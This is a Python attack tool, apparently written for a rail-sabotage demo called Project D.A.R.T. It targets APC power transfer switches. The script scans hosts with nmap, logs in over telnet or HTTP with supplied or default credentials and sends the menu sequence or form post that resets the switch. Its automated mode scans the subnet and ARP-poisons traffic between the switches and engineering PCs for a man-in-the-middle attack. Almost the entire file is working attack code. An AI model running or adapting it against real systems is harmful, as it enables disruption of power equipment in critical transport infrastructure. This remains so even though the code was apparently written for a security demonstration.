#A script to reset the APS Power Transfer Switch, used as part of the train demo aka Project D.A.R.T. (Distruptive Attacks on Rail Transportation)
#Written by Christopher Di-Nozzi

#TODO
#Finish implementing spinners in http.
#Automate MITM functionality????
#add packet sniffing component

import requests #for sending HTTP requests
from pyfiglet import Figlet #pretty banners
import time #sleep (zzz)
import nmap #running network scans
import socket #talking to telnet, telnetlib does not like apc telnet.
import re #a little big of regex magic
import os #clear the terminal!
import random #random banners are stylish
from halo import Halo #loading bars
from scapy.layers.l2 import ARP #MITM attack
import netifaces #get information about local interface

def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
def prCyan(skk): print("\033[96m {}\033[00m" .format(skk))

spinner = Halo(text_color='green',spinner='bouncingBar')

#scan a specific IP for OS and ports. Requires elevated privilages.
def recon(ip):
    nm = nmap.PortScanner()
    #prGreen('[*] Running active scan...')
    spinner.text = 'Running active scan agaisnt: '+ip
    spinner.start()
    host = nm.scan(ip, arguments='-O -sV')
    spinner.succeed()
    print('\n')
    prGreen("[+] OS: "+host['scan'][ip]['osmatch'][0]['name'])
    prGreen('===========================')
    for port in host['scan'][ip]['tcp']:
        prGreen('[+] Port Number: ' +str(port))
        prGreen('[+] State: '+host['scan'][ip]['tcp'][port]['state'])
        prGreen('[+] Service: '+host['scan'][ip]['tcp'][port]['name'])
        prGreen('[+] Product: '+host['scan'][ip]['tcp'][port]['product'])
        print('\n')

#'exploit' telnet (run a bunch of commands to login and reset the switch)
def exploit_telnet(ip, username,password):
    PORT = 23

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        #print('[*] Creating socket connection to: '+IP+":"+str(PORT))
        spinner.text="Creating socket connection to: "+ip+":"+str(PORT)
        spinner.start()
        time.sleep(1)
        try:
            s.connect((ip,PORT))
        except socket.error:
            spinner.color="red"
            spinner.fail("Could not connect to "+ip+":"+str(PORT))
            return
        
        spinner.succeed()
        spinner.text=('[+] Getting data from server...')
        spinner.start()
        res = s.recv(2048)
        res = res + s.recv(2048)
        time.sleep(1)
        #print(res)
        if res==b'\xff\xfb\x01\n\rUser Name : ':
            spinner.succeed()
            spinner.text=('[+] Sending username to socket...')
            spinner.start()
            time.sleep(1)

            for c in username:
                s.sendall(c.encode('UTF-8'))
                s.recv(100)
            s.sendall(b'\r')
            s.recv(100)
            spinner.succeed()

            spinner.text=('[+] Sending password to socket...')
            spinner.start()
            time.sleep(1)
            for c in password:
                s.sendall(c.encode('UTF-8'))
                s.recv(100)
            s.sendall(b'\r')
            spinner.succeed()
            full_res=b''
            time.sleep(1)
            while (1):
                res = s.recv(2048)
                #print(b'\n'+res)
                full_res = full_res+res
                #time.sleep(1)
                if b'\r\n>' in res:
                    prGreen('[+] Login successful (apc:apc)!!\n')
                    spinner.text = ('[+] Server sent back menu, sending commands to reset the switch...')
                    spinner.start()
                    time.sleep(2)
                    break

            s.sendall(b'1')
            s.recv(100)  
            s.sendall(b'\r')  
            while (1):
                res = s.recv(2048)
                full_res = full_res+res
                if b'\r\n>' in res:
                    break    
            
            s.sendall(b'4')
            s.recv(100)  
            s.sendall(b'\r')  
            while (1):
                res = s.recv(2048)
                full_res = full_res+res
                if b'\r\n>' in res:
                    break    

            s.sendall(b'1')
            s.recv(100)  
            s.sendall(b'\r')  
            while (1):
                res = s.recv(2048)
                full_res = full_res+res
                if b':' in res:
                    break 

            time.sleep(2)
            s.sendall(b'Y')
            s.recv(100)            
            s.sendall(b'E')
            s.recv(100) 
            s.sendall(b'S')
            s.recv(100) 
            s.sendall(b'\r')  
            while (1):
                res = s.recv(2048)
                full_res = full_res+res
                time.sleep(1)
                if b'Press <ENTER> to continue...' in res:
                    spinner.succeed()
                    prGreen('[+] Reset successful... break anything good? :^)')
                    break    

        s.close()

#'exploit' http (run a bunch of commands to login and reset the switch)
def exploit_http(ip, username,password):
    #Logon
    data = {
    'login_username': ''+username+'',
    'login_password': ''+password+'',
    'submit': 'Log On',
    }
    response = requests.post('http://'+ip+'/Forms/login1', data=data)
    pattern = r'\/([a-zA-Z0-9]+)\/home\.htm'
    match = re.search(pattern, response.url)
    print(response.url)
    if match:
        token = match.group(1)
        prGreen("[+] Logged in and obtained token: "+token)
    else:
        prRed("[-] Logon probably failed - is someone else already logged on?")
        return
    time.sleep(1)

    #Reset Switch
    data = {
    'controlaction': '1',
    'submit': 'Apply',
    }
    prGreen('[+] Reseting switch!!')
    time.sleep(1)
    response = requests.post('http://'+ip+'/NMC/'+token+'/Forms/control1', data=data)
    time.sleep(1)
    
    #Logout
    logout_url='http://'+ip+'/NMC/'+token+'/logout.htm'
    response = requests.get(logout_url)
    if 'You are now logged off.' in response.text:
        prGreen('[+] Logged out.')

#do the demo automatically by scanning the network, looking for potential APC devices and engineering PCs, then MITM them and search for creds, then reset the switch. this may never work. but if it does, it will be a neat little party trick that will impress lots of people. maybe even my dad.
def automagic():
    #Scan for APC device
    nm = nmap.PortScanner()
    interface_info = netifaces.ifaddresses('en0')
    ip = interface_info[netifaces.AF_INET][0]['addr'] #Get current IP
    cidr = sum(bin(int(x)).count('1') for x in interface_info[netifaces.AF_INET][0]['netmask'].split('.'))
    target = ip +"/"+str(cidr)
    spinner.text="Scanning "+target+" for devices on the network..."
    spinner.start()
    results = nm.scan(target,arguments='-sV')
    #prGreen("[+] OS: "+results['scan']['ip']['osmatch'][0]['name'])
    spinner.succeed()
    apc_devices=list()
    eng_pcs=list()
    for host in results['scan']:
        prGreen("[+] Host: "+host)
        for port in results['scan'][host]['tcp']:
            service = results['scan'][host]['tcp'][port]['name']
            product = results['scan'][host]['tcp'][port]['product']
            #print(results['scan'][host])
            prGreen("[+] Port: "+str(port))
            prGreen('[+] Service: '+service)
            prGreen('[+] Product: '+product)
            if (port==23 or port==80) and (service=='telnet' or service=='http') and 'apc' in product:
                apc_devices.append(host)
            elif('windows' in service): #TODO add more coniditions here to narrow it down
                eng_pcs.append(host)

    if (len(apc_devices)>0 and len(eng_pcs)>0):
        prGreen("[+] Obtained the following APC device(s):")
        for t in apc_devices:
            prGreen("[+] "+t)

        prGreen("[+] Obtained the following potential engineering PCs:")
        for t in eng_pcs:
            prGreen("[+] "+t)
        #if found, posison all ARP cahces for any traffic going it
        for apc in apc_devices:
            for pc in eng_pcs:
                ARP.arp_mitm(pc,apc)
    else:
        prRed('[-] No devices found, self destructing.')
        return

    #then monitor for plain text credentials (telnet or http)

   #if creds found, exploit!
    

    
#print that banner
def print_banner():
    fonts = ['alligator','alligator2','basic','big','block','chunky','colossal','cosmic','epic','isometric1','larry3d']
    banner = Figlet(font=random.choice(fonts),width=1000)
    prCyan(banner.renderText('D. A. R. T.'))

def print_menu():
    os.system('clear')
    print_banner()

    prGreen('1) Recon')
    prGreen('2) Exploit (telnet)')
    prGreen('3) Exploit (http)')
    prGreen('4) Automagic!')
    prRed('0) Exit')

    print('Enter your option: ')
    try:
        i = int(input())
        if i == 1:
            ip = str(input("Enter IP of device: "))
            recon(ip)
            input("Press any key to return to menu...")
        elif i==2:
            ip = str(input("Enter IP of device: "))
            username = str(input('Enter username: '))
            password = str(input('Enter password: '))
            exploit_telnet(ip,username,password)
        elif i==3:
            ip = str(input("Enter IP of device: "))
            username = str(input('Enter username: '))
            password = str(input('Enter password: '))
            exploit_http(ip,username,password)
        elif i==4:
            automagic()
        elif i==0:
            exit()
        else:
            print("Invalid input, try again.")

    except ValueError:
        print("Invalid input, please enter a number")
    
    input("Press any key to return to menu...")

    print_menu()

def main():
    print_menu()


if __name__ == "__main__":
    main()